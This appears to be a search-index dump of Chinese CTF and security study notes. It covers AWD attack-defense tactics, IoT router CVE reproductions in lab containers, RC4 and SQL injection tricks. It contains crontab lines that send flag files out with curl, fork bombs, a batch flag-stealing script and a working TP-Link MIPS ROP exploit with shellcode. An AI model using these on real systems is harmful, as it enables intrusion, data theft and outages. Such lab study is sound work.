"},"awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html":{"url":"awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html","title":"如何在awd中苟活_pwn","keywords":"","body":"充足的资料 awd通常是断网 偷偷开热点，所以资料一定要备足。 个人笔记 平常一定会积累不少exp、工具文档（pwntools，gdb，docker，平常也要多看看文档）、各种工具使用方法，比赛前一定要保存到本地。 pwntools官方文档 ctfwiki 平常学习也经常会用到，记录了漏洞原理和例题。支持docker起环境。 docker 一键起环境 docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki 看一下虚拟机的ip，本机就可以快乐访问了。 how2heap 记录堆利用方法，如果遗忘了一些攻击手法可以快速回忆，不过在awd的时候学可能晚了一点，节奏比较快。。。（但总不能一直吃茶歇把） git clone https://github.com/shellphish/how2heap.git 收集网上的一些awd脚本 web相对来说准备的脚本多一点，pwn的话主要就是批量提交脚本、流量监控脚本。 awd比赛规则 附上太湖杯awd比赛规则，比赛规则大体类似，具体的记分规则和用户权限可能会有所改变。 工具准备 xshell、xftp 远程登陆&传文件 ssh命令 假定你要以用户名user，登录远程主机host，只要一条简单命令就可以了。 ssh pika@192.168.0.111 但一般来说awd需要指定端口，常见2222，需要后面加参数-p 2222 scp命令 1.本地复制到远程 scp远程传文件 指令格式 scp local_file remote_username@remote_ip:remote_folder 或者 scp local_file remote_username@remote_ip:remote_file 或者 scp local_file remote_ip:remote_folder 或者 scp local_file remote_ip:remote_file 第1,2个指定了用户名，命令执行后需要再输入密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名； 第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名； 示例 scp /home/space/music/1.mp3 root@www.runoob.com:/home/root/others/music scp /home/space/music/1.mp3 root@www.runoob.com:/home/root/others/music/001.mp3 scp /home/space/music/1.mp3 www.runoob.com:/home/root/others/music scp /home/space/music/1.mp3 www.runoob.com:/home/root/others/music/001.mp3 复制目录命令格式 scp -r local_folder remote_username@remote_ip:remote_folder 或者 scp -r local_folder remote_ip:remote_folder 第1个指定了用户名，命令执行后需要再输入密码； 第2个没有指定用户名，命令执行后需要输入用户名和密码； 示例 scp -r /home/space/music/ root@www.runoob.com:/home/root/others/ scp -r /home/space/music/ www.runoob.com:/home/root/others/ 2.从远程复制到本地 从远程复制到本地，只要将从本地复制到远程的命令的后2个参数调换顺序即可，如下实例 scp root@www.runoob.com:/home/root/others/music /home/space/music/1.mp3 scp -r www.runoob.com:/home/root/others/ /home/space/music/ ps 如果远程服务器防火墙有为scp命令设置了指定的端口，我们需要使用 -P 参数来设置命令的端口号，命令格式如下： #scp 命令使用端口号 4588 scp -P 4588 remote@www.runoob.com:/usr/local/sin.sh /home/administrator wireshark 流量分析工具，有些比赛可以提供抓包服务，这时候如何根据别人的攻击流量快速复现别人的exp（在大佬屁股后面喝汤）就十分要紧了。 tcpdump抓取攻击流量 tcpdump -i 网卡 -s 0 -w 1.pcap port 端口号 通过追踪tcp流来分析流量 比赛起手式 1.一定要准备确保自己有网线插口，并且是ok的，可以买一个转接口！！！ 2.ssh未发放前，提前开好虚拟机，可以起个ctfwiki的docker，熟悉一下赛制，查看是否提供流量捕获，如果提供流量捕获，可以采取一人攻一人修题+流量分析，根据主办方给的api书写批量提交脚本，写好交互。（熟悉一下requests库） 传递URL参数 ?+键值对 response1 = requests.get(\"http://httpbin.org/get?key1=value1\") print(response1.url) #http://httpbin.org/get?key1=value1 requests提供了params关键字参数来传递参数 parameter = { \"key1\":\"value1\", \"key2\":\"value2\" } response2 = requests.get(\"http://httpbin.org/get\",params = parameter) print(response2.url) # http://httpbin.org/get?key1=value1&key2=value2 还可以将一个列表作为值传入 parameter = { \"key1\":\"value1\", \"key2\":[\"value21\",\"value22\"] } response3 = requests.get(\"http://httpbin.org/get\",params = parameter) print(response3.url) # http://httpbin.org/get?key1=value1&key2=value21&key2=value22 示例 import requests def submit(flag): url = 'https://ctf.bugku.com/awd/submit.html?token=95e0ab88dcae793ac13ba2bfa839fd16&flag='+flag ct = requests.post(url) print ct.text f = 'flag{f828ae331b6cb250015373c75e47e968}' submit(f) 3.ssh发放后，查看ssh是否为弱密码，若发现是弱密码，及时更改密码！！！ 4.备份赛题、ld、libc文件！！！（ld和libc必须是配套的） 5.上通防，根据情况 patch修题 修题是有风险的，修的不好check就过不了而且还有被打的风险 推荐参考文章 CTF线下赛中常用的PWN题patch方法 | p4nda's blog 简单patch-----ida插件keypatch 1.栈溢出类型修补，修改read第三个参数 save to file edit->Patch program->Apply patches in to file... 2.格式化字符串类型修补 printf改puts 3.堆题暴力修题（目前来看不是很推荐，很多主办方也慢慢意识到这个问题了） 看到free通通nop 使用工具lief添加逻辑代码 具体见参考文章 ps patch之后的文件上传后要注意权限的问题，需要有可执行权限 pkill -kill -u username 通防 看了网上不少通防的资料，感觉都不尽人意，感觉都太容易被check到了，所以自己写了一个patch，单纯是修改题目的，沙箱规则可以diy。 自动化 队伍一多要是还是手交那基本一轮还没交完就下一轮了。 示例 from pwn import* import requests def submit(flag): url = 'https://ctf.bugku.com/awd/submit.html?token=95e0ab88dcae793ac13ba2bfa839fd16&flag='+flag ct = requests.post(url) if ct.text.find('Flag')!=-1: print 'ok!!!!' flags = [] def pwn(i): p = remote('192-168-1-'+str(i)+'.awd.bugku.cn',9999) ... ... ... flag = p.recv() flags.append(flag) submit(flag) print flag p.close() #p.interactive() ip = [13, 16, 21, 25, 29, 30, 37, 56, 61, 62, 65, 69, 71, 74, 79, 89, 90, 94, 97, 101, 106, 110, 126, 135, 143, 144, 147, 148, 157, 165, 168, 169, 172, 175, 180, 182, 187, 192, 195, 196, 210, 212, 213, 217, 219, 223, 232, 234, 235, 241, 247] ip.reverse() for i in ip: try: pwn(i) except: pass for i in flags: print i crontab定时任务 * * * * * FLAG=`cat /flag.txt | base64` && curl http://192.168.187.128/?flag=${FLAG} * * * * * FLAG=`curl http://192.168.187.128/get_flag | base64` && curl http://192.168.187.128/?flag=${FLAG} 搅屎 拿下shell后可以试试能不能搅屎，消耗资源，直接宕机。（别在自己机子上试！） fork炸弹 :(){ :|: & };: b(){ b|b& };b awd搅屎指南 https://trello.com/b/avr2o8x8/%E7%BA%BF%E4%B8%8Bawd kill -9 $(pgrep easycanary) "},"IOT漏洞挖掘/":{"url":"IOT漏洞挖掘/","title":"IOT漏洞挖掘","keywords":"","body":""},"IOT漏洞挖掘/IoT-vulhub学习/":{"url":"IOT漏洞挖掘/IoT-vulhub学习/","title":"IoT-vulhub学习","keywords":"","body":""},"IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html","title":"Cisco-CVE-2020-3331","keywords":"","body":"Cisco RV110W 远程代码执行漏洞（CVE-2020-3331） 基础环境从IoT-vulhub下载https://github.com/firmianay/IoT-vulhub 版本：Cisco RV110W 1.2.2.5 漏洞：前台 cgi 接口 guest_logout.cgi 栈溢出 利用：a0 寄存器可控，ret2system 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 httpd（有漏洞 Web 服务器）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:mipsel 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/RV110W_FW_1.2.2.5.bin\" 构建并启动漏洞环境： # 初始化环境 $ ./init_env.sh mipsel # 构建镜像 $ docker-compose -f docker-compose-system.yml build # 启动容器 $ docker-compose -f docker-compose-system.yml up 漏洞复现 在容器中运行利用脚本 # 漏洞利用 $ python3 tools/exp.py 流量抓取 把编译静态的tcpdump进行流量抓取 $ ./tcpdump -s 0 -w 1.pcap port 80 or port 8000 "},"IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html","title":"HUAWEI-CVE-2017-17215","keywords":"","body":"华为 HG532 远程代码执行漏洞（CVE-2017-17215） 基础环境从IoT-vulhub下载https://github.com/firmianay/IoT-vulhub 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 uhttpd（有漏洞 Web 服务器）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:mips 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/HG532eV100R001C01B020_upgrade_packet.bin\" 构建并启动漏洞环境： # 初始化环境 $ ./init_env.sh mips # 构建镜像 $ docker-compose -f docker-compose-system.yml build # 启动容器 $ docker-compose -f docker-compose-system.yml up # 启动完成后，开启 socks 代理 $ ssh -D 2345 root@127.0.0.1 -p 1234 # 配置浏览器代理，即可登陆 Web 后台 http://192.168.2.2/ # 漏洞利用 $ python3 tools/exp.py 漏洞复现 在容器中运行利用脚本 # 漏洞利用 $ python3 tools/exp.py 流量抓取 把编译静态的tcpdump进行流量抓取 $ ./tcpdump -s 0 -w 1.pcap port 80 or port 8000 or port 37215 "},"IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html","title":"Netgear-CVE-2019-20760","keywords":"","body":"Netgear R9000 命令注入漏洞（CVE-2019-20760） 基础环境从IoT-vulhub下载https://github.com/firmianay/IoT-vulhub 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 uhttpd（有漏洞 Web 服务器）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:armhf 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/R9000-V1.0.4.26.img\" 构建并启动漏洞环境： # 初始化环境 $ ./init_env.sh arm # 构建镜像 $ docker-compose -f docker-compose-system.yml build # 启动容器 $ docker-compose -f docker-compose-system.yml up # 启动完成后，开启 socks 代理 $ ssh -D 2345 root@127.0.0.1 -p 1234 # 配置浏览器代理，即可登陆 Web 后台 http://192.168.2.2/cgi-bin/ # 漏洞利用 $ python3 tools/exp.py 漏洞复现 在容器中运行利用脚本 # 漏洞利用 $ python3 tools/exp.py 流量抓取 把编译静态的tcpdump进行流量抓取 $ ./tcpdump -s 0 -w 1.pcap port 80 or port 8000 "},"IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html","title":"Tenda-CVE-2018-16333","keywords":"","body":"Tenda AC15 栈溢出漏洞（CVE-2018-16333） 基础环境从IoT-vulhub下载https://github.com/firmianay/IoT-vulhub 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 httpd（有漏洞 Web 服务器）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:armhf 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin\" 构建并启动漏洞环境： # 初始化环境 $ ./init_env.sh arm # 构建镜像 $ docker-compose -f docker-compose-system.yml build # 启动容器 $ docker-compose -f docker-compose-system.yml up # 启动完成后，开启 socks 代理 $ ssh -D 2345 root@127.0.0.1 -p 1234 # 配置浏览器代理，即可登陆 Web 后台 http://192.168.2.2/ 漏洞复现 在容器中运行利用脚本 # 漏洞利用，根据输出的地址信息修改 libc_base $ python3 tools/exp.py 流量抓取 把编译静态的tcpdump进行流量抓取 $ ./tcpdump -s 0 -w 1.pcap port 80 or port 8000 "},"IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html","title":"Tenda-CVE-2018-5767","keywords":"","body":"Tenda AC15 远程代码执行漏洞（CVE-2018-5767） 基础环境从IoT-vulhub下载https://github.com/firmianay/IoT-vulhub 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 httpd（有漏洞 Web 服务器）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:armhf 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin\" 构建并启动漏洞环境： # 初始化环境 $ ./init_env.sh arm # 构建镜像 $ docker-compose -f docker-compose-system.yml build # 启动容器 $ docker-compose -f docker-compose-system.yml up # 启动完成后，开启 socks 代理 $ ssh -D 2345 root@127.0.0.1 -p 1234 # 配置浏览器代理，即可登陆 Web 后台 http://192.168.2.2/ 漏洞复现 在容器中运行利用脚本 # 漏洞利用，根据输出的地址信息修改 libc_base $ python3 tools/exp.py 流量抓取 把编译静态的tcpdump进行流量抓取 $ ./tcpdump -s 0 -w 1.pcap port 80 or port 8000 "},"IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html","title":"Tenda-CVE-2020-10987","keywords":"","body":"Tenda AC15 命令注入漏洞（CVE-2020-10987） 基础环境从IoT-vulhub下载https://github.com/firmianay/IoT-vulhub 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 httpd（有漏洞 Web 服务器）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:armhf 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin\" 构建并启动漏洞环境： # 初始化环境 $ ./init_env.sh arm # 构建镜像 $ docker-compose -f docker-compose-system.yml build # 启动容器 $ docker-compose -f docker-compose-system.yml up # 启动完成后，开启 socks 代理 $ ssh -D 2345 root@127.0.0.1 -p 1234 # 配置浏览器代理，即可登陆 Web 后台 http://192.168.2.2/ # (貌似访问有问题) 漏洞利用 在容器中运行脚本，运行完可以拿到shell $ python3 tools/exp.py 流量抓取 把编译静态的tcpdump进行流量抓取 $ ./tcpdump -s 0 -w 1.pcap port 80 or port 8000 "},"IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html","title":"TP-Link-CVE-2020-8423","keywords":"","body":"TP-Link WR841N 栈溢出漏洞（CVE-2020-8423） 第一次搞iot相关，对mips的汇编还不是很熟，先熟悉一下搭环境，之后再去理解原理，这里记录一下环境搭建流程。虽然iot-vulhub已经都做好了docker，但在自己复现的时候还是多多少少会有些问题。 IoT-vulhub基础环境搭建 #安装pip $ curl -s https://bootstrap.pypa.io/get-pip.py | python3 #安装docker #命令行输docker，根据提示安装就行 # 启动 docker 服务 $ systemctl start docker # 安装 docker-compose $ python3 -m pip install docker-compose 先下载IoT-vulhub项目 $ git clone https://github.com/firmianay/IoT-vulhub.git 构建基础镜像 # 注意-t标签不要写错，后面不少Dockerfile根据这个名称来拉的 # 构建 ubuntu1604 基础镜像 $ cd baseImage/ubuntu1604 && docker build -t firmianay/ubuntu1604 . # 构建 binwalk 容器，方便使用 $ cd baseImage/binwalk && docker build -t firmianay/binwalk . # 构建 qemu mips 环境 $ cd baseImage/qemu-system/mips # 运行下载脚本 $ ./images/download.sh # 镜像构建 $ docker build -t firmianay/qemu-system:mips . 漏洞环境搭建 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 httpd（有漏洞 Web 服务器）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:mips 漏洞镜像构建 # 先切换到相应的目录 $ cd TP-Link/CVE-2020-8423 # 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/wr841nv10_wr841ndv10_en_3_16_9_up_boot(150310).bin\" # 初始化环境 $ ./init_env.sh mips # 构建镜像 $ docker-compose -f docker-compose-system.yml build 启动环境 # 启动容器 $ docker-compose -f docker-compose-system.yml up 启动的过程有点慢 # 启动完成后，开启 socks 代理 $ ssh -D 2345 root@127.0.0.1 -p 1234 当系统开始不断的跳如下界面说明启动成功，接下来就可以访问http服务了。 本机访问http服务需要挂sock5代理，如下图所示，只需填socks处的主机和端口 然后就可以访问web服务啦，账号admin/admin登入 漏洞验证 根据登入之后的path和cookie就可以验证漏洞了 登陆后得到得到 cookie（如%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D）和 path（如DHJSQKMAPYZXIIXB）： 假如是在docker中访问直接按照项目给的curl命令就行 $ curl -H 'Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D' 'http://192.168.2.2/DHJSQKMAPYZXIIXB/userRpm/popupSiteSurveyRpm_AP.htm?mode=1000&curRegion=1000&chanWidth=100&channel=1000&ssid='$(python -c 'print(\"/%0A\"*0x55 + \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\")')'' 运行完之后就访问不了了 假如是在本机验证还需要加上-x设置socks5代理参数 $ curl -x socks5://127.0.0.1:2345 -H 'Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D' 'http://192.168.2.2/IXFWMIHBBQRZJFPA/userRpm/popupSiteSurveyRpm_AP.htm?mode=1000&curRegion=1000&chanWidth=100&channel=1000&ssid='$(python -c 'print(\"/%0A\"*0x55 + \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\")')'' 效果和上面一样 exp运行 exp.py放在system-emu/tools目录下面，需要修改path和cookie参数，以及请求头中的User-Agent参数 这个exp说实话感觉有点迷惑。。。docker环境里装了的是python3的pwntools，但是exp运行环境是python2。然后请求的时候原来脚本用的是session.get，但代理貌似没有开起来，所以我exp里又改成了request.get，因为session.get不支持socks5代理，只支持http和https代理。 修改之后的exp #!/usr/bin/python2 from pwn import * import requests import urllib context.endian = 'big' libc_base = 0x77d2a000 sleep = 0x53CA0 #end 00053ECC g1 = 0x000E204 #0x77F47204 #LOAD:0000E204 move $t9, $s1 #LOAD:0000E208 jalr $t9 ; sysconf #LOAD:0000E20C li $a0, 3 g2 = 0x00037470 #LOAD:00037470 move $t9, $s2 #LOAD:00037474 lw $ra, 0x28+var_4($sp) #LOAD:00037478 lw $s2, 0x28+var_8($sp) #LOAD:0003747C lw $s1, 0x28+var_C($sp) #LOAD:00037480 lw $s0, 0x28+var_10($sp) #LOAD:00037484 #LOAD:00037484 loc_37484: #LOAD:00037484 jr $t9 ; xdr_opaque_auth #LOAD:00037488 addiu $sp, 0x28 g3 = 0x0000E904 #0x77f47904 #LOAD:0000E904 addiu $a1, $sp, 0x168+var_150 #LOAD:0000E908 move $t9, $s1 #LOAD:0000E90C jalr $t9 ; stat64 #LOAD:0000E910 addiu $a0, (aErrorNetrcFile+0x28 - 0x60000) g4 = 0x00374D8 #LOAD:000374D8 move $t9, $a1 #LOAD:000374DC sw $v0, 0x4C($a0) #LOAD:000374E0 move $a1, $a2 #LOAD:000374E4 jr $t9 #LOAD:000374E8 addiu $a0, 0x4C # 'L' shellcode = \"\\x24\\x0e\\xff\\xfd\\x01\\xc0\\x20\\x27\\x01\\xc0\\x28\\x27\\x28\\x06\\xff\\xff\" shellcode += \"\\x24\\x02\\x10\\x57\\x01\\x01\\x01\\x0c\\xaf\\xa2\\xff\\xff\\x8f\\xa4\\xff\\xff\" shellcode += \"\\x34\\x0e\\xff\\xff\\x01\\xc0\\x70\\x27\\xaf\\xae\\xff\\xf6\\xaf\\xae\\xff\\xf4\" shellcode += \"\\x34\\x0f\\xd8\\xf0\\x01\\xe0\\x78\\x27\\xaf\\xaf\\xff\\xf2\\x34\\x0f\\xff\\xfd\" shellcode += \"\\x01\\xe0\\x78\\x27\\xaf\\xaf\\xff\\xf0\\x27\\xa5\\xff\\xf2\\x24\\x0f\\xff\\xef\" shellcode += \"\\x01\\xe0\\x30\\x27\\x24\\x02\\x10\\x4a\\x01\\x01\\x01\\x0c\\x8f\\xa4\\xff\\xff\" shellcode += \"\\x28\\x05\\xff\\xff\\x24\\x02\\x0f\\xdf\\x01\\x01\\x01\\x0c\\x2c\\x05\\xff\\xff\" shellcode += \"\\x24\\x02\\x0f\\xdf\\x01\\x01\\x01\\x0c\\x24\\x0e\\xff\\xfd\\x01\\xc0\\x28\\x27\" shellcode += \"\\x24\\x02\\x0f\\xdf\\x01\\x01\\x01\\x0c\\x24\\x0e\\x3d\\x28\\xaf\\xae\\xff\\xe2\" shellcode += \"\\x24\\x0e\\x77\\xf9\\xaf\\xae\\xff\\xe0\\x8f\\xa4\\xff\\xe2\\x28\\x05\\xff\\xff\" shellcode += \"\\x28\\x06\\xff\\xff\\x24\\x02\\x0f\\xab\\x01\\x01\\x01\\x0c\" s0 = p32(0x11111111) s1 = p32(g2+libc_base) # break s2 = p32(sleep+libc_base) payload = \"/%0A\"*0x55 + 2*'x' + s0 + s1 + s2 payload += p32(g1+libc_base) payload += 'x'*28 payload += p32(g4+libc_base) #s1 payload += p32(0x33333333) #s2 payload += p32(g3+libc_base) #ra payload += 'x'*24 payload += shellcode def exp(path,cookie): headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0\", \"Cookie\":\"Authorization=Basic{cookie}\".format(cookie=str(cookie))} params = { \"mode\":\"1000\", \"curRegion\":\"1000\", \"chanWidth\":\"100\", \"channel\":\"1000\", \"ssid\":urllib.unquote(payload) } url=\"http://192.168.2.2:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm\".format(path=str(path)) resp = requests.get(url,params=params,headers=headers,timeout=10,proxies={'http':'socks5://127.0.0.1:2345'}) print(resp.text) exp(\"AEAMATJAMXMAVVYB\",\"%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D\") 运行之后效果图 这里的shellcode可能还有点问题，看上去感觉是执行sleep的，但是运行完exp显示的是SIGSEGV，有待考察，不过肯定栈溢出了。 流量抓取 开了代理的话就只能本地访问然后在docker容器里去抓了，结果tcpdump有问题，尝试了修复链接库，但是无果，还好之前编译过静态的tcpdump，拿过来直接用就完事了。 把编译好的tcpdump复制进容器，在容器(代理服务器)中抓流量 $ ./tcpdump -s 0 -w 1.pcap port 80 "},"IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html":{"url":"IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html","title":"VIVOTEK-CVE-2020-10987","keywords":"","body":"Vivotek CC8160 栈溢出漏洞 基础环境从IoT-vulhub下载https://github.com/firmianay/IoT-vulhub 漏洞环境 docker：攻击、调试主机：192.168.2.1 qemu-system：固件主机：192.168.2.2 httpd（有漏洞服务）：192.168.2.2:80 镜像依赖：firmianay/ubuntu1604 -> firmianay/qemu-system:armel 使用 firmianay/binwalk 解压固件： $ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer \"/root/firmware/CC8160-VVTK-0100d.flash.pkg\" 系统模拟 构建并启动漏洞环境： # 初始化环境 $ ./init_env.sh arm # 构建镜像 $ docker-compose -f docker-compose-system.yml build # 启动容器 $ docker-compose -f docker-compose-system.yml up # 等待启动完成，重新打开一个窗口 $ docker exec -it vivotek-system /bin/bash $ ssh root@192.168.2.2 漏洞复现 在容器中运行利用脚本 需要将libuClibc-0.9.33.3-git.so拷至exp运行目录下 $ cd tools $ python3 exp.py $ ./exp.sh 流量抓取 把编译静态的tcpdump进行流量抓取 $ ./tcpdump -s 0 -w 1.pcap port 80 "},"密码学/":{"url":"密码学/","title":"密码学","keywords":"","body":""},"密码学/AES/AES.html":{"url":"密码学/AES/AES.html","title":"AES","keywords":"","body":""},"密码学/RC4/RC4.html":{"url":"密码学/RC4/RC4.html","title":"RC4","keywords":"","body":"RC4 简介 RC4是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。 原理 RC4算法的原理很简单，包括初始化算法（KSA）和伪随机子密码生成算法（PRGA)两大部分。 算法流程图 1.利用key生成S盒（KSA） 假设S-box的长度为256，密钥长度为Len，先初始化向量S（256个字节），按照升序，给每个字节赋值0,1,2,3,4,5,6…..,254,255。 伪代码 for i from 0 to 255 S[i] := i endfor j := 0 for i from 0 to 255 j := (j + S[i] + key[i mod keylength]) mod 256 swap values of S[i] and S[j] endfor 2.利用S盒生成密钥流 密钥流的生成如下图所示 循环体中每收到一个字节，a 和 b 定位S盒中的一个元素，并与输入字节异或，得到密文 k；同时，c 还改变了 S 盒。由于异或运算的特性，使得加密与解密过程一致。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。 伪代码如下 i := 0 j := 0 while GeneratingOutput: i := (i + 1) mod 256 // a j := (j + S[i]) mod 256 // b swap values of S[i] and S[j] // c K := inputByte ^ S[(S[i] + S[j]) mod 256] // d output K endwhile 3.密钥流与输入异或 这一步很简单，直接逐字节异或就行。 python实现 from binascii import* def KSA(key): keyLength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keyLength]) % 256 S[i], S[j] = S[j], S[i] return S def PRGA(S,Len): i = 0 j = 0 keystream = [] for _ in range(Len): i = (i+1)%256 j = (j+S[i]) %256 S[i],S[j] = S[j],S[i] k = S[(S[i]+S[j])%256] keystream.append(k) return keystream def Xor(plaintext,keystream): c = '' for i in range(len(plaintext)): c += chr(ord(plaintext[i]) ^ keystream[i]) return c def RC4(key,plaintext): key = [ord(c) for c in key] S = KSA(key) keystream = PRGA(S,len(plaintext)) c = Xor(plaintext,keystream) return str2byte(c).decode() def str2byte(c): re = b'' for i in c: re += b'%02x'%ord(i) return re def byte2str(c): re = '' for i in c: re += chr(i) return re if __name__ == '__main__': choice = 0 key ='Key' if choice == 0: plaintext = 'Plaintext' c = RC4(key,plaintext) print('密文====>'+c) elif choice ==1: c = b'bbf316e8d940af0ad3' c = byte2str(unhexlify(c)) m = RC4(key,c) print('明文====>'+unhexlify(m).decode()) 运行结果 密文====>bbf316e8d940af0ad3 明文====>Plaintext "},"web/":{"url":"web/","title":"web","keywords":"","body":""},"web/sql注入/sql注入.html":{"url":"web/sql注入/sql注入.html","title":"sql注入","keywords":"","body":"alter 添加一个列 alter table \"table_name\" add \"column_name\" type; 删除一个列 alter table \"table_name\" drop \"column_name\" type; 改变列的数据类型 alter table \"table_name\" alter column \"column_name\" type; 如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句 。 例如，把字段 c 的类型从 CHAR(1) 改为 CHAR(10)，可以执行以下命令: ALTER TABLE testalter_tbl MODIFY c CHAR(10); 使用 CHANGE 子句, 语法有很大的不同。 在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型。尝试如下实例： ALTER TABLE testalter_tbl CHANGE j j INT; 改列名 alter table \"table_name\" change \"column1\" \"column2\" type; alter table \"table_name\" rename \"column1\" to \"column2\"; show show datebases; //数据库。 show tables; //表名。 show columns from table; //字段。 Illegal mix of collations for operation 'UNION'情况 问题描述 sql注入时想通过union来查看所有表名时出了个奇怪的报错 执行的sql语句 经过检查，发现时字段编码不同导致的问题。 这里first_name和last_name的字段编码是utf8_unicode_ci TABLE_SCHEMA的字段编码是utf8_general_ci 解决方法 1.对表字段hex处理，然后可以通过hackbar再转回ascii码 2.用BINARY函数直接转成二进制字符串 mysql_real_escape_string() 函数绕过 定义和用法 mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 下列字符受影响： \\x00 \\n \\r \\ ' \" \\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 语法 mysql_real_escape_string(string,connection) 参数 描述 string 必需。规定要转义的字符串。 connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 绕过方法 对于字符串，转换成16进制形式可以绕过。 sql预处理绕过关键字 这里select转换成了char的形式，可以实现select过滤的绕过。 char(115,101,108,101,99,116)'select' 